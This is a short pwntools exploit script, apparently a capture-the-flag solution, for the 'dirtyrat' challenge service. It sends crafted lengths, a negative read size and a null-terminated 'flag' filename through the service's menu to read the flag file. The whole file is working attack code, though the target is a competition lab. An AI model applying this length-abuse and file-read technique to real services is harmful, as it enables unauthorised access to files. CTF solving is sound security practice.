#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

p = remote('dirtyrat.challs.m0lecon.it', '10010')

def write(l,data=0):
  p.sendlineafter('choice: ', '3')
  p.sendlineafter('filename: ', 'conf')
  if (data==0):
    p.sendlineafter('features): ', '\x00')
  else:
    p.sendlineafter('features): ', data)
  p.sendlineafter('): ', str(l))


def read(l, fname=0):
  p.sendlineafter('choice: ', '2')
  if (fname==0):
    p.sendlineafter('filename: ','conf')
  else:
    p.sendlineafter('filename: ',fname)
  p.sendlineafter('): ', str(l))


write(65536)
read(-1)
read(33)
write(0,'flag\x00')

read(100,'flag')

p.interactive()
